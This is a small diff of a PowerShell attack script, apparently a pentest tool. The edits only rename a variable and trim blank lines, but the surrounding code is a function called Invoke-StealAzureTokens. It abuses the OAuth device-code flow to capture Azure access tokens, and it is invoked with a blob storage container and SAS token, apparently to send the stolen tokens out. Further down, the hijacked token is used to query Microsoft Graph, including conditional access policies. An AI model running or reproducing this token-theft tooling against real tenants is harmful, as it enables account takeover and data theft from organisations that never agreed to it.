@@ -33,12 +33,12 @@ function Invoke-StealAzureTokens {
 
     }
     process {
-        $authResponse = Invoke-RestMethod @AuthSplat
-        $authResponse.message
+        $AuthResponse = Invoke-RestMethod @AuthSplat
+        $AuthResponse.message
         $Body.Remove('resource')
         $AuthSplat['Uri'] = 'https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0'
         $Body['grant_type'] = [string]'urn:ietf:params:oauth:grant-type:device_code'
-        $Body['code'] = [string]$authResponse.device_code
+        $Body['code'] = [string]$AuthResponse.device_code
 
         while ([string]::IsNullOrEmpty($TokenResponse.Access_Token)) {
             try {
@@ -72,8 +72,6 @@ function Invoke-StealAzureTokens {
 }
 
 Invoke-StealAzureTokens -ContainerUri 'https://pentest.blob.core.windows.net/test' -SasToken 'sv=2022....'
-
-
 
 <#
     .SYNOPSIS
@@ -161,5 +159,3 @@ switch ($Entity) {
     "Policies" { $Entity = "identity/conditionalAccess/policies" }
 }
 Invoke-GraphAPIRequest -GraphURL "https://graph.microsoft.com/Beta/$($Entity)" -Method 'GET' -AccessToken $HiJackedTokens.access_token
-
-
